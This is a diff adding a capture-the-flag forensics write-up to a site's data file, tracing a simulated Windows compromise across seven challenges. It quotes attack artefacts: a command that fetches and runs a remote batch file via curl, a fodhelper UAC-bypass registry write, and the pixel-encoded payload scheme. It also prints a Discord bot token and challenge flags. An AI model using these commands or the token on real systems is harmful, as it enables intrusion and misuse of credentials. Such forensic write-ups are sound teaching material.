@@ -24,6 +24,303 @@
 
 const WRITEUPS_DATA = [
 
+// ================================================================
+// UMCS CTF 2026 — DFIR
+// ================================================================
+
+   {
+    id:         'umcs-metamon-1-to-7',
+    title:      'Metamon 1 to 7',
+    ctf:        'UMCS CTF 2026',
+    category:   'DFIR',
+    difficulty: 'Medium',
+    points:     null,
+    date:       'April 2026',
+    summary:    'A seven-part digital forensics investigation tracking the full compromise of a Windows workstation. The attacker leveraged ClickFix social engineering, mshta-based payload delivery, privilege escalation via fodhelper, pixel-encoded PowerShell stages, and a Discord-backed command-and-control implant.',
+
+    content: `
+## Challenge Overview
+
+Ahmad woke up one morning to find his Windows machine acting strangely. He swears he never deliberately ran anything suspicious while surfing the web, yet someone is now demanding payment from him. Our job is to piece together exactly what happened — from the first foothold all the way to the attacker's toolkit — using the disk image and memory snapshot provided.
+
+---
+
+## Metamon 1
+
+**Flag:** \`UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}\`
+
+### Mounting the Evidence
+
+We load the supplied \`.ad1\` forensic image into **FTK Imager** and browse the evidence tree to Ahmad's Desktop folder. Three items immediately catch our attention sitting alongside each other: \`README.txt\`, \`LOCKED.7z\`, and \`memdump.mem\`.
+
+![FTK Imager showing Ahmad's Desktop with README.txt content and Base64 string](assets/images/CTF/UMCS/Metamon/m1_ftk_desktop.png)
+
+### Reading the Dropped Note
+
+Clicking on \`README.txt\` in the file content pane brings up a standard extortion message telling Ahmad to reach out to \`fulan123@securemail.cc\`. What makes it interesting is a suspicious string tacked onto the very bottom of the file:
+
+\`\`\`
+VU1DU3szZl9mMXJzN19nbGFmXzR0X3I0bnNvbV9uMFQzfQ==
+\`\`\`
+
+That pattern is unmistakably Base64. Piping it through a decoder gives us the flag immediately:
+
+\`\`\`bash
+echo "VU1DU3szZl9mMXJzN19nbGFmXzR0X3I0bnNvbV9uMFQzfQ==" | base64 -d
+# UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}
+\`\`\`
+
+![Base64 decode output revealing the flag](assets/images/CTF/UMCS/Metamon/m1_base64_decode.png)
+
+**Flag:** \`UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}\`
+
+---
+
+## Metamon 2
+
+**Flag:** \`UMCS{http://pinarat.github.io/a}\`
+
+### Hunting for the Entry Point
+
+The next question is how the attacker got in. Since Ahmad insists he was just browsing, we turn to his web browser history. The three most common locations to check on a Windows machine are:
+
+- **Chrome:** \`C:\\Users\\ahmad\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\\`
+- **Edge:** \`C:\\Users\\ahmad\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\\`
+- **Firefox:** \`C:\\Users\\ahmad\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile>.default-release\\\`
+
+![Common browser history file locations on Windows](assets/images/CTF/UMCS/Metamon/m2_browser_locations.png)
+
+We strike gold with the Edge \`History\` file — it is present in the image.
+
+### Inspecting the SQLite Database
+
+After exporting the file, we open it in **DB Browser for SQLite** and scan the \`urls\` table. The vast majority of rows are harmless Bing searches. Entry number 23 is the odd one out:
+
+![DB Browser for SQLite showing Edge history with row 23 highlighted as the suspicious URL](assets/images/CTF/UMCS/Metamon/m2_edge_history.png)
+![Attacker GitHub account showing the public repository named a](assets/images/CTF/UMCS/Metamon/m3_github_profile.png)
+
+- **Row:** 23
+- **URL:** \`http://pinarat.github.io/a\`
+- **Page Title:** reCAPTCHA Verification
+
+A legitimate CAPTCHA page never calls itself that — this is a textbook **ClickFix** lure. The victim lands on a fake verification screen, presses a button thinking they are proving they are human, and unknowingly paste a malicious command into a Run dialog.
+
+**Flag:** \`UMCS{http://pinarat.github.io/a}\`
+
+---
+
+## Metamon 3
+
+**Flag:** \`UMCS{Ra-T4-TA-Ta_BU7_1_doN7_w4nT_tO}\`
+
+### Visiting the Phishing Page
+
+Now that we have the URL, we visit it and confirm the fake CAPTCHA behaviour. Clicking the checkbox silently places a command on the clipboard. The command calls \`mshta\` against a file hosted on the same GitHub Pages site.
+
+### Pivoting to the Attacker's Repository
+
+Navigating to \`https://github.com/pinarat\` reveals a single public repository named \`a\`. Inside it sits \`b.mp4\` along with \`index.html\` and \`test.txt\`. More interestingly, the commit log shows that \`profile.png\` was added and then deleted — we make a note of that for later.
+
+![Repository file listing with b.mp4, index.html, and test.txt](assets/images/CTF/UMCS/Metamon/m3_repo_contents.png)
+
+![Commit history showing the upload and subsequent deletion of profile.png](assets/images/CTF/UMCS/Metamon/m3_commit_history.png)
+
+### Digging Into b.mp4
+
+Running \`exiftool\` against the file reports a warning about unrecognised trailer data near the end of the container. \`binwalk\` makes it concrete — there is an HTML document hiding inside the MP4 wrapper.
+
+![binwalk scan of b.mp4 confirming an appended HTML document](assets/images/CTF/UMCS/Metamon/m3_binwalk_bmp4.png)
+
+We carve it out with:
+
+\`\`\`bash
+dd if=b.mp4 bs=1 skip=4172063 count=421 of=hidden_payload.html
+\`\`\`
+
+### Tracing the Payload Chain
+
+The extracted HTML creates a \`WScript.Shell\` object and silently executes:
+
+\`\`\`cmd
+cmd /c curl -L -o %temp%\\rizzler.bat "https://gist.githubusercontent.com/pinarat/.../rizzler.bat" & %temp%\\rizzler.bat
+\`\`\`
+
+Pulling \`rizzler.bat\` from the Gist, we find a **fodhelper.exe UAC bypass** — the attacker writes a payload path under the \`ms-settings\` shell protocol handler. The flag is sitting in plain sight as the registry value being written:
+
+\`\`\`cmd
+reg add "HKCU\\Software\\Classes\\ms-settings\\CurVer" /ve /d "UMCS{Ra-T4-TA-Ta_BU7_1_doN7_w4nT_tO}" /f
+start /b "" "C:\\Windows\\System32\\fodhelper.exe"
+\`\`\`
+
+![rizzler.bat content showing the registry write with the flag embedded as the value](assets/images/CTF/UMCS/Metamon/m3_rizzler_registry.png)
+
+**Flag:** \`UMCS{Ra-T4-TA-Ta_BU7_1_doN7_w4nT_tO}\`
+
+---
+
+## Metamon 4
+
+**Flag:** \`UMCS{STay_1N_7hE_M1dDLe,l1kE_Y0U_A_LiTlLE,DONt_Want_NO_RidD1E}\`
+
+### Unpacking the Encoded Command
+
+Once \`fodhelper.exe\` fires and grants elevated execution, \`rizzler.bat\` hands off to PowerShell via a \`-EncodedCommand\` argument — the entire next stage is a Base64-encoded UTF-16LE blob. Decoding it exposes a script that is still heavily obfuscated: every sensitive string — URLs, function names, cryptographic keys — has been scrambled with a **Caesar-style rotation cipher**, applied separately to uppercase and lowercase characters.
+
+![Decoded PowerShell stage showing the Caesar-obfuscated strings and steganography extraction routine](assets/images/CTF/UMCS/Metamon/m4_powershell_stage2.png)
+
+### Breaking the Substitution
+
+Writing a short Python helper that applies the correct shift for each string peels back the obfuscation in seconds:
+
+![Python Caesar decoder recovering profile.png URL and the XOR key from obfuscated strings](assets/images/CTF/UMCS/Metamon/m4_caesar_decode.png)
+
+- **Filename:** \`suriloh.sqj\` (shift −23) → \`profile.png\`
+- **Download URL:** \`myyux://unsfwfy.lnymzg…\` (shift −21) → \`https://pinarat.github.io/a/profile.png\`
+- **XOR key:** \`54e6739f170fg582\` (shift −24) → \`54c6739d170de582\`
+
+### Reconstructing the Hidden Payload
+
+\`profile.png\` looks completely normal to the naked eye, but the PowerShell reads it as raw binary rather than as an image. The encoding scheme works like this:
+
+- The **R, G, B channels of pixels 0 and 1** pack a 32-bit integer that tells the script how many payload bytes follow
+- Every subsequent **R, G, B byte** is treated as one byte of ciphertext, collected until the length is satisfied
+
+After gathering those bytes the script **XORs** them against \`54c6739d170de582\` (repeating) and then **GZIP-decompresses** the result into a third-stage PowerShell script. We replicate the same logic in Python using Pillow — open the image, read the size integer from the first two pixels, loop through every subsequent pixel collecting R, G, B values until the byte count is satisfied, XOR the resulting buffer against the key cycling byte by byte, then feed the output into \`gzip.decompress()\`. The script completes without error and writes out \`final_stage.ps1\`, confirming the extraction worked correctly.
+
+### Locating the Flag in Stage 3
+
+A quick search through the decompressed script for the flag prefix turns up the following variable declaration:
+
+\`\`\`powershell
+$ebnV3ty = 'UMCS{STay_1N_7hE_M1dDLe,l1kE_Y0U_A_LiTlLE,DONt_Want_NO_RidD1E}'
+\`\`\`
+
+![Grep result on the decompressed stage-3 script showing the $ebnV3ty variable holding the flag](assets/images/CTF/UMCS/Metamon/m4_stage3_flag.png)
+
+This string is not just the answer — it immediately gets converted to bytes and reused as the XOR key for decrypting the final binary. Without solving this challenge first, you cannot obtain the next payload.
+
+**Flag:** \`UMCS{STay_1N_7hE_M1dDLe,l1kE_Y0U_A_LiTlLE,DONt_Want_NO_RidD1E}\`
+
+---
+
+## Metamon 5
+
+**Flag:** \`UMCS{Me7amoN_t4p4u3d_8y_y0u_}\`
+
+### What is Ditto.exe?
+
+The stage-3 script takes the Metamon 4 flag, converts it to a byte array, and uses it as a repeating XOR key to decrypt a huge Base64-encoded blob. The decrypted result is written to \`%TEMP%\\Ditto.exe\` and immediately launched. Running \`strings\` against the binary surfaces PyInstaller bootstrap filenames and PyArmor runtime references — this is a **Python application frozen into a standalone executable and then obfuscated**.
+
+![strings output from Ditto.exe revealing PyInstaller bootstrap and PyArmor runtime filenames](assets/images/CTF/UMCS/Metamon/m5_ditto_strings.png)
+
+### Moving to Dynamic Analysis
+
+Because PyArmor scrambles the bytecode at rest, we cannot simply decompile it. Instead we spin up an isolated VM, execute \`Ditto.exe\`, and capture a full process memory snapshot. The moment the binary runs it starts attempting outbound connections and printing status lines about pinging C2 addresses.
+
+Sifting through the dump for HTTP-related strings surfaces something more telling — a **User-Agent header** that references the discord.py library, making the C2 mechanism obvious.
+
+![Memory dump HTTP strings exposing the Discord bot User-Agent string](assets/images/CTF/UMCS/Metamon/m5_discord_useragent.png)
+
+### Reconstructing the Bot Configuration
+
+Widening the search to the keyword \`discord\` pulls out the bot token, server identifier, and a partial channel listing buried in gateway event JSON:
+
+![Memory dump strings showing the bot token, guild ID, and channel metadata](assets/images/CTF/UMCS/Metamon/m5_discord_config.png)
+
+- **Bot handle:** \`Slave1\`
+- **Server name:** \`Fulan's Hideout\`
+- **Server ID:** \`1448523475680759881\`
+
+### Pulling the Messages
+
+Armed with the token we directly query the Discord API for the message history of the \`cybershit\` channel (\`1494961740486807744\`):
+
+\`\`\`bash
+BOT_TOKEN="MTQ0ODUyNDMxMDk2MzY4NzU1Ng.GFzsdR.1PXCJhvZy5-64kAY33VaySN5km0uRpCl5aCuhw"
+curl -H "Authorization: Bot $BOT_TOKEN" \\
+  "https://discord.com/api/v10/channels/1494961740486807744/messages?limit=50"
+\`\`\`
+
+The response contains a Base64-encoded string posted by the operator:
+
+![Discord API JSON response containing the Base64 flag string in the channel content field](assets/images/CTF/UMCS/Metamon/m5_discord_c2.png)
+
+\`\`\`bash
+echo "VU1DU3tNZTdhbW9OX3Q0cDR1M2RfOHlfeTB1X30=" | base64 -d
+# UMCS{Me7amoN_t4p4u3d_8y_y0u_}
+\`\`\`
+
+![Terminal showing the decoded Base64 string resolving to the flag](assets/images/CTF/UMCS/Metamon/m5_flag_decode.png)
+
+**Flag:** \`UMCS{Me7amoN_t4p4u3d_8y_y0u_}\`
+
+---
+
+## Metamon 6
+
+**Flag:** \`UMCS{GcJqVl9YaVwBIPC4nbOW}\`
+
+### What Are We After?
+
+Revisiting the Desktop artefacts spotted during Metamon 1, we have \`LOCKED.7z\` sitting alongside the memory dump. The challenge wants the password the attacker used to seal that archive.
+
+![FTK Imager file listing of Ahmad's Desktop with LOCKED.7z and memdump.mem highlighted](assets/images/CTF/UMCS/Metamon/m6_desktop_files.png)
+
+### Recovering the Ghost Command
+
+Windows records recently executed command lines in process memory, but they are stored as **UTF-16 Little-Endian** wide strings. Standard \`strings\` skips them entirely — we need the \`-el\` flag to target 16-bit encoded text:
+
+\`\`\`bash
+strings -el memdump.mem | grep -i "important.txt" -B 5 -A 5
+\`\`\`
+
+The output hands us the full archiving command the attacker ran, password included:
+
+\`\`\`cmd
+cmd.exe /c "7z.exe" a "C:\\Users\\ahmad\\Desktop\\LOCKED.7z"
+"C:\\Users\\ahmad\\Desktop\\Me\\important.txt" -pGcJqVl9YaVwBIPC4nbOW -mhe=on
+\`\`\`
+
+![Wide-string grep output from the memory dump showing the complete 7z command with the -p password argument](assets/images/CTF/UMCS/Metamon/m6_volatility_7z.png)
+
+\`\`\`bash
+7z x -pGcJqVl9YaVwBIPC4nbOW LOCKED.7z
+\`\`\`
+
+**Flag:** \`UMCS{GcJqVl9YaVwBIPC4nbOW}\`
+
+---
+
+## Metamon 7
+
+**Flag:** \`UMCS{2607a3bbbc8c4482aadb9eadc13a1f40b2030f9d77be3151ed4d24a8d306fe23, f6d3de4e0827046ecd87f33906e63fb632557de53696b58c9754c8a905674aae, 60b53f85e92e79e8f3894b99160bd8e65d6da9b9d4f938107939317a40b48fe5}\`
+
+### Mapping the Dropped Files
+
+To wrap up the investigation we need to produce SHA-256 hashes for each piece of malware that touched disk during the attack. Walking back through the chain gives us three candidates:
+
+- **\`rizzler.bat\`** *(Metamon 3)* — Initial dropper fetched via \`curl\`; handles privilege escalation through the \`fodhelper\` registry trick
+- **\`profile.png\`** *(Metamon 4)* — Carrier image; hides an XOR-encrypted and GZIP-compressed PowerShell stage inside its pixel data
+- **\`Ditto.exe\`** *(Metamon 5)* — Final implant; a PyArmor-hardened Discord bot that lands in the user's temp folder
+
+### Hashing the Evidence
+
+\`\`\`bash
+sha256sum rizzler.bat profile.png Ditto.exe
+\`\`\`
+
+![Terminal output of sha256sum run against all three IOC files](assets/images/CTF/UMCS/Metamon/m7_sha256_hashes.png)
+
+- **\`rizzler.bat\`** → \`2607a3bbbc8c4482aadb9eadc13a1f40b2030f9d77be3151ed4d24a8d306fe23\`
+- **\`profile.png\`** → \`f6d3de4e0827046ecd87f33906e63fb632557de53696b58c9754c8a905674aae\`
+- **\`Ditto.exe\`** → \`60b53f85e92e79e8f3894b99160bd8e65d6da9b9d4f938107939317a40b48fe5\`
+
+The submission format expects all three hashes in lowercase, separated by a comma and a space inside the flag wrapper.
+
+**Flag:** \`UMCS{2607a3bbbc8c4482aadb9eadc13a1f40b2030f9d77be3151ed4d24a8d306fe23, f6d3de4e0827046ecd87f33906e63fb632557de53696b58c9754c8a905674aae, 60b53f85e92e79e8f3894b99160bd8e65d6da9b9d4f938107939317a40b48fe5}\`
+    `,
+  },
+
   // ================================================================
   // Hack@10 International CTF 2026 — FORENSICS
   // ================================================================
